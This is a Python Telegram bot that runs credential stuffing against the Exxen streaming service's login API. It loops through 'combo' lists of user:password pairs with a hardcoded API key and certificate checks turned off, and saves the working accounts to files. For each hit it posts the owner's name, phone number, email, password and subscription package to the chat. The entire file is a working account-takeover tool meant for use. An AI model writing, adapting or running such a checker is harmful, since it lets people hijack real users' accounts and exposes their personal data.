import os, time
import sys
import re
import asyncio
import requests
import json
from datetime import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram import Client, filters

import logging
logging.basicConfig(level = logging.DEBUG,
                     format="%(asctime)s - %(name)s - %(message)s - %(levelname)s")

logger = logging.getLogger(__name__)

import pyrogram
import os

from config import BOT_TOKEN, APP_ID, API_HASH

logging.getLogger('pyrogram').setLevel(logging.WARNING)

if __name__ == '__main__':

    if not os.path.isdir('combo'):
        os.mkdir('combo')

    plugins = dict(root='plugins')

    app = pyrogram.Client(
        'Combo',
        bot_token=BOT_TOKEN,
        api_id=APP_ID,
        api_hash=API_HASH
    )

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

directory = "./combo/"
HitsDocument = "Hits.txt"
ExxenTellPass = "Exxen TelPass.txt"

key = "90d806464edeaa965b75a40a5c090764"
api = "api-crm.exxen.com"


def write(hits):
    file = open(HitsDocument, 'a+', encoding="utf8")
    file.write(hits)
    file.close()


def tellpass(tell):
    file = open(ExxenTellPass, 'a+', encoding="utf8")
    file.write(tell)
    file.close()


def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


headers = {
    "Accept-Language": "en-US;q=1.0",
    "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    "User-Agent": "Exxen/1.0.23 (com.exxen.ios; build:5; iOS 15.4.0) Alamofire/5.4.4",
    "Connection": "keep-alive",
    "Host": "api-crm.exxen.com",
    "Origin": "com.exxen.ios",
    "Content-Type": "application/json;charset=utf-8",
}


def replace(string, substitutions):
    substrings = sorted(substitutions, key=len, reverse=True)
    regex = re.compile('|'.join(map(re.escape, substrings)))
    return regex.sub(lambda match: substitutions[match.group(0)], string)


substitutions = {
    "RKLMYOK Monthly": "Reklam Yok, Aylık 29,90 ₺",
    "RKLMVAR Monthly": "Reklam Var, Aylık 19,90 ₺",
    "RKLMYOK Yearly": "Reklam Yok, Yıllık 299,90 ₺",
    "RKLMVAR Yearly": "Reklam Var, Yıllık 99,90 ₺",
    "Spor Monthly": "Spor, Aylık 39,90 ₺",
    "Spor Yearly": "Spor, Yıllık 298.80 ₺",
    "Spor Seaon": "Spor, Sezon 298.80 ₺"
}




@Client.on_message(filters.command(['start']))
async def help_message(app, message):
    say = 0
    dsy = ""
    if 1 == 1:
        for files in os.listdir(directory):
            say = say + 1
            dsy = dsy + "	" + str(say) + "-) " + files + '\n'
        await message.reply_text(
            "Choose your combo from the list below." + "\n\n" + dsy + "\n" + str(
                say) + " Files found in your Combo folder.")

        await message.reply("Choose Combo: ", reply_markup=ForceReply(True))

@Client.on_message(filters.reply)
async def api_connect(client, message):
    custom = 0
    total = 0
    hit = 0
    cpm = 1
    done = 0
    if (message.reply_to_message.reply_markup) and isinstance(message.reply_to_message.reply_markup, ForceReply):
        try:
            msg = await message.reply_text("**✓ İşlem Başlatılıyor..**", reply_to_message_id=message.message_id)
            dsyno = int(message.text)
            print(dsyno)
            say = 0
            for files in os.listdir(directory):
                say = say + 1
                if dsyno == say:
                    txt = (directory + files)
        except Exception as f:
            print(f)
            await message.reply_text(f"**Error :** {f}", reply_to_message_id=message.message_id)
        try:
            for mp in open(txt, 'r', encoding="utf8"):
                mr = mp.split(' ')[0]
                mp = mr.replace("\n", "")
                USER = mp.split(':')[0]

                check_number = str(USER[:1])

                if check_number.isnumeric():
                    check = 'Mobile'
                    if check_number == '0':
                        USER = '+9' + USER
                    else:
                        USER = '+90' + USER
                else:
                    check = 'Email'

                try:
                    PASS = mp.split(':')[1]
                    if len(PASS) == 6:
                        PASS += '00'
                except:
                    PASS = '123456789'

                url = f"https://{api}/membership/login/{check}?key={key}"
                data = {check: USER, 'Password': PASS}

                while True:
                    try:
                        res = session.post(url, headers=headers, data=json.dumps(data), timeout=15, verify=False)
                        break
                    except requests.exceptions.Timeout as e:
                        print(e)

                # print (res.content)
                Res = str(res.text)
                total = total + 1

                cpm = (time.time() - cpm)
                cpm = (round(60 / cpm))
                Exxen = str()
                done += 1
                if "CreateDate" in Res:
                    Name = find_between(str(Res), ',"Name":"', '"')
                    Surname = find_between(str(Res), ',"Surname":"', '"')

                    if "LicenseName" in Res:
                        Package = find_between(str(Res), ',"LicenseName":"', '"')
                        Package = replace(Package, substitutions)
                        if "SPOR" in Res:
                            Exxen += "\n╠●⚽ <b>Spor Paket:</b> ✓"

                    if "LicenseStartDate" in Res:
                        hit = hit + 1
                        Package_Start = find_between(str(Res), ',"LicenseStartDate":"', '"')
                        Package_End = find_between(str(Res), ',"LicenseEndDate":"', '"')
                        start = datetime.fromisoformat(Package_Start)
                        end = datetime.fromisoformat(Package_End)
                        Exxen += ("\n╠●📆 <b>Başlangıç:</b> " + str(start) + "\n" + "╠●📆 <b>Bitiş:</b> " + str(end))
                    else:
                        custom = custom + 1
                        Package = "Custom ¯\_(ツ)_/¯"

                    if "Number" in Res:
                        Tel = find_between(str(Res), ',"Number":"+90', '"')
                        tellpass(Tel + ":" + PASS + "\n")
                        Exxen += ("\n╠●📞 <b>Tel:</b> " + "<code>" + Tel + "</code>")

                    if Package is not None:
                        Exxen += (
                                f"\n╠●👤 <b>Ad-Soyad:</b> {Name} {Surname}\n╠●✉ <b>{check}:</b> " +
                                "<code>" + USER + "</code>" + "\n" + "╠●🔑 <b>Şifre:</b> " + "<code>" + PASS + "</code>" +
                                "\n" + "╠●💎 <b>Paket:</b> " + Package)
                        print(Exxen + "\n")
                        await message.reply_text("╔╣ <b>𝙀𝙓𝙓𝙀𝙉</b>" + Exxen + "\n╚ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᴬᶜᵘⁿ╝", parse_mode='HTML')
                        write(Exxen + "\n")
                else:
                    print(mp + " Cpm: " + str(cpm) + " Taranan: " + str(total))
                    cpm = time.time()
                if not done % 20:
                    try:
                      await msg.edit(f"Tamamlanan: {done}")
                    except MessageNotModified:
                      pass
        finally:
            await message.reply_text("**✓ İşlem Başarıyla Tamamlandı**" + "\n" + "➤ Total: " + str(total) + " Hit: " + str(hit) + " Custom: " + str(custom))

app.run()
